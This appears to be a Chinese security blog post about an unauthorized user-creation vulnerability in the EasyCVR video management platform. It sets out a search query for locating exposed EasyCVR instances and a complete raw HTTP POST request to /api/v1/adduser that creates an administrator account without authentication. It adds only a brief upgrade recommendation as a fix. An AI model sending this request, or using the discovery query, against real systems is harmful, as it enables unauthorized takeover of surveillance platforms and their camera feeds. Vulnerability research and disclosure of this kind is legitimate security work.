#  EasyCVR视频管理平台未授权添加用户漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-03-05 02:21  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
# EasyCVR视频管理平台未授权添加用户漏洞  
#   
  
02  
  
—  
  
影响版本  
  
**影响版本：v3.1.0及以下版本**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS1cZpuFGiapM9sZAK8WIepbKnGyCU9bexUTuE85hzpewe9jJgzLVziakykBEgwH95Yswxe5r21sCf4a0Gys660RyicB4cGia5v1kTg/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS1JxBVuexHzpyom4qnbBT8C3YRBcXzAbwdc4nrrvhA4FZj7QTJtI7WnH1xSQwj71hAicaLXOPNrO7A2PUibiaTPEbNj3tVdRRVAK8/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0 "")  
  
03  
  
—  
  
漏洞简介  
  
EasyCVR视频管理平台是一款功能强大的视频融合与智能分析平台，支持多协议接入，可兼容市面上绝大多数监控设备，实现跨品牌、跨型号设备的统一纳管。平台提供实时远程监控、视频录像与回放、智能分析告警、云台控制等功  
能，并支持手机、电脑、大屏等多终端访问，广泛应用于安防监控、智慧城市、智慧农业、智慧工地等场景，帮助用户实现视频资源的集中管理、智能分析与高效利用  
。  
攻击者可利用平台未严格验证用户权限的接口，直接向特定接口发送恶意请求，在系统中添加任意用户，从而获取系统控制权。  
  
04  
  
—  
  
资产测绘  
```
title="EasyCVR"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS3q0BkIUKNB6FwgapuiastoPH1UKicXgEpMsibsVJibicRDK4umnwcTt0YibBgNlevFLFK6UexWUq1df2EeBkOKticVdTvJicia0PTU9mvk/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
POST /api/v1/adduser HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: token=RCetmLH4R; SECKEY_ABVK=341O79W4ebXI1fwZXWjp1G8KixaJDAcDBdnf50Iva64%3D; BMAP_SECKEY=i6mxYDDH5WQdJKN_C_0Xw4ayl-QTr1QcSJry8L7F0ewxzGX9Cjo_Sr0KLsJ9zPXc8UMYdnVqTVygJYoUMgJlOQCX15jvQCgEK2mBeM2rts7_CrNwHVhE-3Xl2HgfhP8D8Ha05OupktNQUbUqdtnLk2BpDi3qw75g0O4OOML07bFSouG-DFJGQ-ZiQu8a0oNl
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
If-Modified-Since: Fri, 21 Oct 2022 02:44:31 GMT
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
name=admin&username=admin&password=0e7517141fb53f21ee439b355b5a1d0a&roleid=1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS2guO6NBgrs1QmN8q1dvW9Aic5HR6dnpmM0iaHRDTmR4FHQRKVhtjXYNALCHbEqFOsWiausgaISYHPK7WDgcSPPjqZM1EyuhicX6zY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0UHYGCCZDdJxoDyYKq0ib1rfiakS0tFF9tj8TNtPNiaSDP9HTyGrcRcPCV85RG4RhERlTJxtoRswGkldGYwRzu0t9ecQW1CDa7w0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS3rXFq6eMfyibHIzMYRFdPmTgoFPOvib8D6khwTc4hWBdSEaPBXicEfI0LOSvom3wJvyFvXeXJShicrj39e1lB12Xk3ToPXQsSTnXc/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
升级到最新版本（如v3.2.0及以上）  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
